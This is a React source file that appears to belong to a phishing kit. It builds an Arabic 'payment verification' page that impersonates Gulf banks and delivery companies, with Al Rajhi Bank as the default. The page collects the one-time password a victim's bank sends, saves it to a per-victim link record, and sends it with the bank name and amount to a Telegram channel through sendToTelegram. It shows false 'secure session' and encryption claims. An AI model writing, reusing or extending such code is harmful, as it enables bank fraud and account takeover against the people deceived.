import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { bankBranding } from "@/lib/brandingSystem";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  ShieldCheck,
  Smartphone,
  Timer,
  RefreshCw,
  Loader2,
  Lock,
  CheckCircle2,
  Building2,
  Truck,
  Wallet,
} from "lucide-react";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentOTP = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [timer, setTimer] = useState(120);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || '';

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    if (selectedBankId) return resolveEntity(selectedBankId);
    return resolveEntity(companyKey);
  }, [selectedBankId, companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const category = companyKey.includes('shipping') ? 'shipping' : companyKey.includes('bank') ? 'bank' : 'payment_gateway';

  useEffect(() => {
    const countdown = setInterval(() => setTimer((prev) => (prev > 0 ? prev - 1 : 0)), 1000);
    return () => clearInterval(countdown);
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length < 6) {
      toast({ title: "خطأ", description: "يرجى إدخال رمز التحقق كاملاً", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, otp: otpValue } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "otp-verification",
          linkId: id!,
          otp: otpValue,
          bank: selectedBank?.nameAr || "البطاقة البنكية",
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'otp_verification',
        data: { otp: otpValue, bank: selectedBank?.nameAr || "البطاقة البنكية", amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/receipt${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return null;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
      <PaymentMetaTags
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey || "bank"}
        serviceName={selectedBank?.nameAr || entityConfig.nameAr}
        title="تأكيد رمز التحقق (OTP)"
      />

      <ThemedHeader
        config={entityConfig}
        title={selectedBank?.nameAr || entityConfig.nameAr}
        subtitle="SECURE SESSION"
      />

      <main className="flex-1 flex items-center justify-center p-4 py-12">
        <div className="w-full max-w-md space-y-8">
          <ThemedCard config={entityConfig} variant="elevated" className="text-center">
            <div className="p-8 sm:p-12 space-y-8">
              <div
                className="w-20 h-20 rounded-3xl mx-auto flex items-center justify-center text-white shadow-xl animate-in zoom-in duration-500"
                style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}
              >
                <Smartphone className="w-10 h-10" />
              </div>

              <div className="space-y-2">
                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>رمز التحقق لمرة واحدة</h2>
                <p className="text-sm font-medium leading-relaxed" style={{ color: entityConfig.textMuted }}>
                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل لدى {selectedBank?.nameAr || entityConfig.nameAr} لإتمام عملية دفع <span className="font-bold" style={{ color: entityConfig.text }}>{formattedAmount}</span>
                </p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-8">
                <div className="flex justify-center gap-3 sm:gap-4" dir="ltr">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      ref={(el) => (inputRefs.current[index] = el)}
                      className="text-center text-3xl font-bold transition-all"
                      style={{
                        width: '3.5rem',
                        height: entityConfig.btnHeight,
                        borderRadius: entityConfig.inputRadius,
                        border: `2px solid ${entityConfig.inputBorder}`,
                        backgroundColor: '#FFFFFF',
                        color: entityConfig.text,
                        fontSize: '1.875rem',
                        fontFamily: entityConfig.font,
                        outline: 'none',
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = entityConfig.primary;
                        e.target.style.boxShadow = `0 0 0 3px ${entityConfig.inputFocusRing}`;
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = entityConfig.inputBorder;
                        e.target.style.boxShadow = 'none';
                      }}
                      required
                    />
                  ))}
                </div>

                <div className="space-y-6">
                  <div className="flex items-center justify-center gap-4 text-sm">
                    <div className="flex items-center gap-1.5 font-bold" style={{ color: entityConfig.textMuted }}>
                      <Timer className="w-4 h-4" />
                      <span>تنتهي صلاحية الرمز خلال:</span>
                    </div>
                    <span className="font-bold min-w-[3rem]" style={{ color: entityConfig.primary }}>
                      {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
                    </span>
                  </div>

                  <ThemedButton
                    config={entityConfig}
                    type="submit"
                    disabled={isSubmitting}
                    loading={isSubmitting}
                  >
                    {isSubmitting ? "جاري التحقق..." : "تأكيد الرمز"}
                  </ThemedButton>

                  <button
                    type="button"
                    disabled={timer > 0}
                    className="flex items-center justify-center gap-2 mx-auto text-sm font-bold transition-colors disabled:opacity-50"
                    style={{ color: entityConfig.textMuted }}
                  >
                    <RefreshCw className="w-4 h-4" />
                    <span>إعادة إرسال الرمز</span>
                  </button>
                </div>
              </form>
            </div>

            <div className="p-6 sm:p-8 border-t flex items-center gap-4 text-right" style={{ backgroundColor: `${entityConfig.primary}03`, borderColor: entityConfig.inputBorder }}>
              <div className="w-12 h-12 rounded-full border flex-shrink-0 flex items-center justify-center shadow-sm" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
                <ShieldCheck className="w-6 h-6" />
              </div>
              <div className="space-y-0.5">
                <p className="text-[10px] font-bold uppercase" style={{ color: entityConfig.text }}>Secure Verification</p>
                <p className="text-[9px] font-medium leading-none" style={{ color: entityConfig.textMuted }}>هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
              </div>
            </div>
          </ThemedCard>

          <p className="text-[10px] font-bold text-center uppercase tracking-widest px-8 leading-relaxed" style={{ color: entityConfig.textMuted }}>
            لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
          </p>
        </div>
      </main>
    </div>
  );
};

import React from "react";
export default PaymentOTP;
